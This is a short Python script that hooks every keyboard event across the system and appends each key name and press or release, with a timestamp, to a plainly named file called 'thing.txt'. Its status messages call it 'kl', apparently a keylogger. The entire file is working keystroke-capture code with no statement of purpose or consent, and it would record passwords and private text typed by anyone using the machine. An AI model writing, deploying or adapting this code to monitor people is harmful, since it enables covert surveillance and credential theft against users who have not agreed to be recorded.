import keyboard
import datetime
import os
import sys
import traceback

output_file = "thing.txt"
log_file = "console.log"

def ensure_file_exists(file_path):
    try:
        if not os.path.exists(file_path):
            with open(file_path, "w") as f:
                pass
            log_to_console(f"INFO: Created {file_path}")
    except Exception as e:
        log_to_console(f"ERROR: Failed to create {file_path}: {e}")

def log_to_file(message):
    try:
        ensure_file_exists(output_file)
        with open(output_file, "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        log_to_console(f"ERROR writing to {output_file}: {e}")

def log_to_console(message):
    try:
        ensure_file_exists(log_file)
        with open(log_file, "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        print(f"Failed to log to {log_file}: {e}", file=sys.stderr)

def handle_event(event):
    try:
        log_to_file(f"Key {event.name} {event.event_type}")
    except Exception:
        log_to_console(f"ERROR handling event:\n{traceback.format_exc()}")

def main():
    try:
        log_to_console("INFO: kl started")
        keyboard.hook(handle_event)
        keyboard.wait()
    except KeyboardInterrupt:
        log_to_console("INFO: kl interrupted by user")
    except Exception:
        log_to_console(f"ERROR:\n{traceback.format_exc()}")
    finally:
        log_to_console("INFO: kl stopped")

if __name__ == "__main__":
    main()
